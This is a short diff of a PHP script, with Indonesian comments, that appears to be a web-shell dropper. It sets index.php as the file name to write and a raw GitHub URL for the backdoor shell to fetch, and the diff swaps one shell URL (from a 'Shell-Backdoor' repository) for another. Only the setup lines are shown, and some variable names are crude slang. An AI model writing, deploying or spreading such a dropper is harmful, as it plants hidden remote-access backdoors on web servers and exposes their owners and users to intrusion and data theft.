@@ -1,6 +1,6 @@
 <?php
 $anu = "index.php"; /// ganti nama shell mu 
-$url = "https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/ee.php"; /// url shellmu
+$url = "https://raw.githubusercontent.com/kikiii88/sadboy/main/back/mati/kau/png2.txt"; /// url shellmu
 $kontol = __FILE__;
 $current_dir = realpath(dirname($kontol));
 $kimak = $current_dir."/".$anu;
